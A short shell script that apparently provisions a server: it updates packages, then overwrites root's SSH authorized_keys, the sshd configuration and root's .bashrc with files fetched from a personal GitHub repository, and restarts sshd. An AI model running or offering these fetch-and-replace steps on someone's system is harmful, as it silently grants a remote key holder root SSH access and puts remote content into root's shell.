#!/bin/sh

mkdir -p ~/.ssh/



mkdir -p /data/temp/


#apt install screen -y


#screen


apt-get update -y


apt-get upgrade -y


cd ~/.ssh/

mv authorized_keys authorized_keys.bak.bak

wget "https://raw.githubusercontent.com/s0trcwd1/pub/main/authorized_keys"

cd /etc/ssh/



mv -f sshd_config sshd_config.bak.bak



wget "https://raw.githubusercontent.com/s0trcwd1/pub/refs/heads/main/sshd_config"



mv /root/.bashrc /root/.bashrc.bak

wget -P /root/ "https://raw.githubusercontent.com/s0trcwd1/pub/main/bashrc"

#wget -P /root/ "https://raw.githubusercontent.com/s0trcwd1/pub/main/bashrc"

mv /root/bashrc /root/.bashrc


systemctl restart sshd

apt install iptables openssl wget ca-certificates curl -y
